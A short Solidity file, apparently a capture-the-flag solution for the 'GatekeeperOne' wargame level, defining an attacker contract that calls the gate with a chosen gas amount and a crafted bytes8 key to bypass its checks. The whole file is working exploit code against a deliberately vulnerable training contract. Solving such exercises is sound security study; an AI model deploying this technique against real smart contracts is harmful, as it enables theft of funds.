// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "instances/13_gatekeeperone.sol";

contract AttackerGatekeeperOne {
    function exploit(
        address gatekeeperOne,
        uint256 gas,
        uint256 delta
    ) public payable {
        GatekeeperOne(gatekeeperOne).enter{gas: gas}(
            bytes8(uint64(delta + 2**32))
        );
    }
}
